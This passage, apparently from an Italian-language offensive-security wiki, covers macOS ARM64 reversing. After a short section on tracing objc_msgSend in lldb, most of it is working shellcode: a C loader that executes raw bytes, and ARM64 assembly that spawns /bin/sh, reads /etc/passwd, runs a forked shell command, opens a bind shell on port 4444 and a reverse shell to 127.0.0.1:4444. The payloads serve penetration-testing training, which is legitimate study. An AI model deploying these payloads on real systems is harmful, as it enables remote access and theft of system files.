Ad esempio, la chiamata `gettimeofdate` legge il valore di `timeval` direttamente dalla pagina comm.

### objc_msgSend

È molto comune trovare questa funzione utilizzata in programmi Objective-C o Swift. Questa funzione consente di chiamare un metodo di un oggetto Objective-C.

Parametri ([maggiori informazioni nella documentazione](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Puntatore all'istanza
- x1: op -> Selettore del metodo
- x2... -> Resto degli argomenti del metodo invocato

Quindi, se metti un breakpoint prima del ramo a questa funzione, puoi facilmente trovare cosa viene invocato in lldb con (in questo esempio l'oggetto chiama un oggetto da `NSConcreteTask` che eseguirà un comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Impostando la variabile di ambiente **`NSObjCMessageLoggingEnabled=1`** è possibile registrare quando questa funzione viene chiamata in un file come `/tmp/msgSends-pid`.
>
> Inoltre, impostando **`OBJC_HELP=1`** e chiamando qualsiasi binario puoi vedere altre variabili di ambiente che potresti usare per **log** quando si verificano determinate azioni Objc-C.

Quando questa funzione viene chiamata, è necessario trovare il metodo chiamato dell'istanza indicata, per questo vengono effettuate diverse ricerche:

- Esegui la ricerca della cache ottimistica:
- Se ha successo, fatto
- Acquisisci runtimeLock (lettura)
- Se (realize && !cls->realized) realizza la classe
- Se (initialize && !cls->initialized) inizializza la classe
- Prova la cache della classe:
- Se ha successo, fatto
- Prova l'elenco dei metodi della classe:
- Se trovato, riempi la cache e fatto
- Prova la cache della superclasse:
- Se ha successo, fatto
- Prova l'elenco dei metodi della superclasse:
- Se trovato, riempi la cache e fatto
- Se (resolver) prova il risolutore di metodi e ripeti dalla ricerca della classe
- Se sei ancora qui (= tutto il resto è fallito) prova il forwarder

### Shellcodes

Per compilare:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Per estrarre i byte:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Per le versioni più recenti di macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Codice C per testare lo shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preso da [**qui**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) e spiegato.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="con stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="con adr per linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Leggi con cat

L'obiettivo è eseguire `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, quindi il secondo argomento (x1) è un array di parametri (che in memoria significa uno stack degli indirizzi).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Esegui il comando con sh da un fork in modo che il processo principale non venga terminato
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell da [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) in **porta 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Da [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
